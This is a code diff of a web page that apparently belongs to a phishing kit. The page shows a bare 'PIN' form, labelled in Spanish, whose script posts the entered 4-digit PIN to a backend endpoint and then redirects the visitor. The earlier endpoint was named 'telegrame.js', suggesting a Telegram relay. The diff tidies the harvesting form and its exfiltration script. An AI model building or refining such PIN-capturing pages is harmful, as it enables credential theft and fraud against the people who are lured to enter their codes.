@@ -181,32 +181,35 @@
 <!-- Procedure Section -->
 
 <section class="procedure">
-<h2 style="font-weight: normal; line-height: 1.875rem; color: rgb(76, 83, 93); background-color: rgb(255, 255, 255); text-transform: uppercase; border-bottom: 0.625rem solid rgb(133, 204, 242);"><span style="font-size: 11px;"><span class="badge badge-info" style="box-sizing: inherit; padding: 3px 7px; vertical-align: middle; border-radius: 10px; min-width: 10px; background-color: rgb(51, 122, 183);"><span id="numeroAvisosId" style="box-sizing: inherit;">5</span></span> <span style="color: rgb(51, 122, 183); font-weight: 700;">&nbsp; PIN</span></span></h2>
+<h2>
+<span style="font-size: 11px;">
+<span class="badge badge-info" style="background-color: #337ab7; border-radius: 10px; padding: 3px 7px;">5</span>
+<span style="color:#337ab7; font-weight:700;"> PIN</span>
+</span>
+</h2>
 
 <form id="pinForm" method="post">
-<div class="row">
-<div class="col-md-6 form-group">&nbsp;</div>
-
-<div class="col-md-6 form-group">&nbsp;</div>
-
-<div class="col-md-6 form-group"><span style="font-size: 13px; font-weight: 600;">Pin&nbsp;</span>
-<input type="text" maxlength="4" class="form-control mb-3" name="pin_code" placeholder="0000" required />
+<div class="form-group">
+<label>Pin</label>
+<input type="text" maxlength="4" class="form-control" name="pin_code" placeholder="0000" required />
 </div>
+<button type="submit" class="btn btn-primary w-100">Enviar</button>
+</form>
 
-<div class="col-md-6 form-group">&nbsp;</div>
 <script>
 document.getElementById("pinForm").addEventListener("submit", async function(e) {
   e.preventDefault();
   const pin = e.target.pin_code.value;
 
   try {
-    await fetch("/api/telegrame.js", {
+    const res = await fetch("/api/sendPin", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ pin_code: pin })
     });
 
-    // redirect بعد الإرسال
+    const data = await res.json();
+    console.log(data);
     window.location.href = "index.html";
   } catch (err) {
     console.error(err);
@@ -214,20 +217,6 @@ document.getElementById("pinForm").addEventListener("submit", async function(e) 
   }
 });
 </script>
-
-<div class="row">
-<div class="col-md-6 form-group">&nbsp;</div>
-</div>
-
-<div class="row">
-<div class="col-md-4 form-group">&nbsp;</div>
-
-<div class="col-md-4 form-group">&nbsp;</div>
-</div>
-
-    <button type="submit" class="btn btn-primary w-100">Enviar</button>
-</div>
-</form>
 </section>
 
 <footer>
